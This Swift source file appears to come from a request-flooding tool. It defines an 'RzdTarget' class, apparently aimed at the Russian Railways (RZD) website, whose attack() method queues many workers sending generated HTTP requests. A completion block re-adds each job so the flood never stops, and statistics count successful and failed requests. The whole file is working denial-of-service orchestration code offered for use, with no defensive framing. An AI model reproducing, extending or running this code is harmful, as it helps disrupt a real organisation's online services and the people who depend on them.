import Foundation

class RzdTarget: Target {
  let name: String = "RZD"
  let operationQueue: OperationQueue
  let scale: Int
  let urlSession: URLSession
  private (set) var stats: Stats = ThreadSafeStats()

  private let rzdJobGenerator = RzdJobGenerator()
  private let rzdRequestsGenerator = RzdRequestGenerator()

  internal init(operationQueue: OperationQueue, scale: Int, urlSession: URLSession) {
    self.operationQueue = operationQueue
    self.scale = scale
    self.urlSession = urlSession
  }

  func attack() {
    for _ in 0...scale {
      addRzdJob()
    }
  }

  private func addRzdJob() {
    let rzdWorker = RzdWorker(
      with: rzdJobGenerator.generateRandomJob(),
      session: urlSession,
      requestsGenerator: rzdRequestsGenerator
    )
    rzdWorker.completionBlock = {

      // we need to keep strong reference to self otherwise completion block will be deallocated before execution
      if rzdWorker.isSucceed == true {
        self.stats.increaseSuccess()
      } else {
        self.stats.increaseErrors()
      }

      // on completion of every job we create a new one to keep it infinite
      self.addRzdJob()

      // set completion block to nil to break cycle memory reference
      rzdWorker.completionBlock = nil
    }
    operationQueue.addOperation(rzdWorker)
  }
}
